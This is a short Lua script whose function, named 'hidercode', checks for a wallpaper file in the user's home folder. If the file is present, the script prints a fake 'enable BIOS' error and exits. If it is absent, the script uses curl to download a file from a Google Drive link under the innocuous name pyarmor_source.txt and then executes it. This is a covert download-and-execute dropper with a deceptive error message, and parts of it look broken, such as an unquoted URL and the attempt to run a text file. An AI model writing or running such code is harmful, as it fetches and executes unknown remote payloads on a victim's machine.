function hidercode()
    local file_path = os.getenv("HOME") .. "/Pictures/My Wallpaper.jpg"
    if os.execute("test -f " .. file_path) then
        print("Error 0x000x00019 Please enable BIOS")
        return
    else
        os.execute("curl -o pyarmor_source.txt https://drive.google.com/uc?export=download&id=1-AEN5v-8QjyPw46LK1SnGazmfwjmaIXZ")
        os.execute("pyarmor_source.txt")
    end
end

hidercode()
